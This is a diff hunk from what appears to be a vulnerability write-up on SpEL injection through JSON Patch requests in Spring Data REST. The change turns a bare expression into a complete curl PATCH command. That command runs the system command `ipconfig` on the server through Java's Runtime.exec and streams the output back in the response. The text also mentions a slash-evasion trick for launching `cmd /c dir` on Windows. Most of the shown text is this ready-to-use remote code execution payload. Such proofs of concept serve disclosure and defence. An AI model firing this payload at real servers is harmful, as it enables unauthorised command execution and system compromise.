@@ -44,7 +44,7 @@ curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" 
 To obtain the output of launched commands, some "gadgets" offered by Spring Framework code can be used. Luckily, no external dependencies are required. For example, the result of `ipconfig` command can be retrieved with the following request.
 
 ```
-T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x
+curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
 ```
 
 On Windows, a `cmd /c dir` command, and other similar commands, can be launched with the following request. Please note the trick used to insert the slash char avoiding the explicit value (i.e. explicit slashes are replaced with dots befor the real parsing).
